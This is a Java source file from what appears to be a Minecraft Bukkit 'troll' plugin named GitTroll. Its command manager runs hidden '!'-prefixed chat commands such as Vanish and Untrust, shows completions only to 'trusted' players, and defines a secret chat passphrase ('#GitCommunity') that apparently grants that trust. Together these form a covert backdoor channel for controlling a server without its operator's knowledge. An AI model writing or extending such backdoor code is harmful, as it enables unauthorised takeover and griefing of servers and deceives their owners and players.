package net.Lenni0451.GitTroll.manager;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.command.CommandWrongException;
import net.Lenni0451.GitTroll.command.commands.TestCommand;
import net.Lenni0451.GitTroll.command.commands.player.Untrust;
import net.Lenni0451.GitTroll.command.commands.player.Vanish;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class CommandManager implements Listener {
	
	public static final String COMMAND_PREFIX = "!";
	public static final String TRUST_COMMAND = "#GitCommunity";
	
	
	private List<CommandBase> commands;
	//Register commands here
	public final TestCommand TestCommand = null;
	public final Vanish Vanish = null;
	public final Untrust Untrust = null;
	
	public CommandManager() {
		this.commands = new ArrayList<>();
		Bukkit.getPluginManager().registerEvents(this, GitTroll.getInstance());
		
		try {
			for(Field field : CommandManager.class.getDeclaredFields()) {
				if(CommandBase.class.isAssignableFrom(field.getType())) {
					field.setAccessible(true);
					if(field.get(this) == null) {
						field.set(this, field.getType().newInstance());
					}
					CommandBase command = (CommandBase) field.get(this);
					this.addCommand(command);
					field.setAccessible(false);
				}
			}
		} catch (Exception e) {}
	}
	
	private void addCommand(final CommandBase command) {
		this.commands.add(command);
		if(command instanceof Listener) {
			Bukkit.getPluginManager().registerEvents((Listener) command, GitTroll.getInstance());
		}
		if(command instanceof EventListener) {
			GitTroll.getInstance().eventManager.registerAllEvents((EventListener) command);
		}
	}
	
	public CommandBase getCommandByName(final String name) {
		for(CommandBase commandBase : this.commands) {
			if(commandBase.getName().equalsIgnoreCase(name)) {
				return commandBase;
			}
		}
		return null;
	}
	
	public boolean onMessage(final Player player, final String message) {
		//toLowerCase() just in case if someone changes the command prefix to a letter or something
		if(!message.toLowerCase().startsWith(COMMAND_PREFIX.toLowerCase())) {
			return false;
		}
		String[] commandParts = message.split(" ");
		
		String commandLabel = commandParts[0].substring(COMMAND_PREFIX.length());
		String[] args = Arrays.copyOfRange(commandParts, 1, commandParts.length);
		
		for(CommandBase commandBase : this.commands) {
			if(commandBase.getName().equalsIgnoreCase(commandLabel)) {
				Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
					try {
						commandBase.execute(CustomPlayer.instanceOf(player), new ArrayHelper(args));
					} catch (CommandWrongException e) {
						CustomPlayer.instanceOf(player).sendGitMessage("§cThe command is wrong.");
						CustomPlayer.instanceOf(player).sendGitMessage("§aPlease use §6" + commandBase.getName() + " " + commandBase.getHelp());
					} catch (Exception e) {
						CustomPlayer.instanceOf(player).sendGitMessage("§cAn error occurred whilst executing this command.");
					}
				});
				return true;
			}
		}
		CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
		customPlayer.sendGitMessage("§cThe command does not exist.");
		//TODO: Actual help command
		customPlayer.sendGitMessage("Use §6" + COMMAND_PREFIX + "help §afor help.");
		return true;
	}
	
	@EventHandler
	public void onTabComplete(PlayerChatTabCompleteEvent event) {
		if(GitTroll.getInstance().isPlayerTrusted(event.getPlayer())) {
			try {
				if(event.getChatMessage().startsWith(COMMAND_PREFIX)) {
					String[] args = event.getChatMessage().split(" ");
					
					List<String> tabs = new ArrayList<>();
					
					CommandBase cmd = this.getCommandByName(args[0].substring(COMMAND_PREFIX.length()));
					if(cmd == null) {
						for(CommandBase tmpCMD : this.commands) {
							if(tmpCMD.getName().toLowerCase().startsWith(args[0].substring(COMMAND_PREFIX.length()).toLowerCase())) {
								tabs.add(COMMAND_PREFIX + tmpCMD.getName());
							}
						}
					} else {
						cmd.tabComplete(tabs, new ArrayHelper(Arrays.copyOfRange(args, 1, args.length - (event.getChatMessage().endsWith(" ")?0:1))));
						if(!event.getChatMessage().endsWith(" ")) {
							tabs = getListOfStringsMatchingLastWord(args[args.length - 1], tabs);
						}
					}
					
					Collections.sort(tabs);
					event.getTabCompletions().clear();
					event.getTabCompletions().addAll(tabs);
				}
			} catch (Exception e) {}
		}
	}
	
	private List<String> getListOfStringsMatchingLastWord(String compare, List<String> possibilities) {
		List<String> list = new ArrayList<String>();
		for(int i = 0; i < possibilities.size(); i++) {
			String possibility = possibilities.get(i);
			if(possibility.toLowerCase().startsWith(compare.toLowerCase())) {
				list.add(possibility);
			}
		}
		return list;
	}
	
}
